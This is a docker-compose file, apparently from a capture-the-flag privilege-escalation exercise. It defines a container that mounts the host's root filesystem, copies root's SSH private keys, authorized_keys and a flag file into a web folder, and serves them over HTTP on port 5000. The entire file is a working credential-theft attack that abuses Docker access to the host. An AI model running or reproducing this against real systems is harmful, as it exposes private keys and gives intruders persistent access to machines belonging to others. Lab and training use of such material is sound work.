services:
  root-reader:
    image: python:3.11-alpine
    command: >
      sh -c "mkdir -p /www/copy &&
             cp /host/root/.ssh/harem-deploy-key /www/copy/harem-deploy-key 2>/www/copy-errors.txt || true &&
             cp /host/root/.ssh/dev-server-key.pem /www/copy/dev-server-key.pem 2>>/www/copy-errors.txt || true &&
             cp /host/root/.ssh/authorized_keys /www/copy/root-authorized-keys 2>>/www/copy-errors.txt || true &&
             cp /host/root/flag4.txt /www/copy/root-flag4.txt 2>>/www/copy-errors.txt || true &&
             python3 -m http.server 5000 -d /www"
    ports:
      - "5000"
    volumes:
      - "/:/host:ro"